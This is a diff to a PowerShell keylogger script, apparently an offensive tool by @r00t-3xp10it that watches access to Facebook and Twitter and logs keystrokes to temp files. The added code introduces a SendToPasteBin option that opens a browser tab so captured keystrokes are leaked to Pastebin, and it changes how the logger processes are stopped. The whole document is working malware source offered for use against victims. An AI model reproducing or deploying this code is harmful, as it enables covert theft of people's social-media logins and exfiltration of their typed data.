@@ -368,7 +368,7 @@ function Invoke-CheckMediaForChange ()
 
       If(-not($LastAccessed -match "^($SocialSite)$"))
       {
-         write-host "  ╰➤ 🎯 " -ForegroundColor Green -NoNewline
+         write-host "  ╰➤ ⛑️ " -ForegroundColor Green -NoNewline
          write-host "move detected from " -ForegroundColor Red -NoNewline
          write-host "$LastAccessed" -ForegroundColor Green -NoNewline
          write-host " to " -ForegroundColor Red -NoNewline
@@ -504,7 +504,6 @@ If($Mode -iMatch '^(start)$')
                ## Key`logger running -- backup void.log logfile
                write-host "  💀 Key`logger running in background!"
                Get-Content -Path "$Env:TMP\void.log" -EA SilentlyContinue|Out-File "$Env:TMP\AUTO_BACKUP.${SocialSite}" -force
-
             }
             Else
             {
@@ -560,10 +559,26 @@ If($Mode -iMatch '^(stop)$')
    .SYNOPSIS
       Author: @r00t-3xp10it
       Helper - Stop key`logger process (PID) and leak captures
+
+   .NOTES
+      Parameter SendToPasteBin is used in this function to
+      give time for Out-Pastebin cmdlet to finish is work!
+      PS C:\> .\SocialMedia.ps1 -mode 'stop' -sendtopastebin
    #>
 
+   ## SendToPasteBin function
+   If($SendToPasteBin.IsPresent)
+   {
+      start "https://elgoog.im/pacman" ## Open new tab to force SendToPasteBin to kick in!
+      Start-Sleep -Seconds 5
+   }
+
    ## Kill all PID's
-   Invoke-KillAllPids
+   $PPID = (Get-Content "$Env:TMP\pid.log" -EA SilentlyContinue|Where-Object { $_ -ne '' })
+   If(-not([string]::IsNullOrEmpty($PPID)))
+   {
+      Invoke-KillAllPids
+   }
 
    write-host "`n"
    $GetLogNames = (dir $Env:TMP).Name|findstr /C:'.Facebook' /C:'.Twitter' /C:'AUTO_BACKUP.'
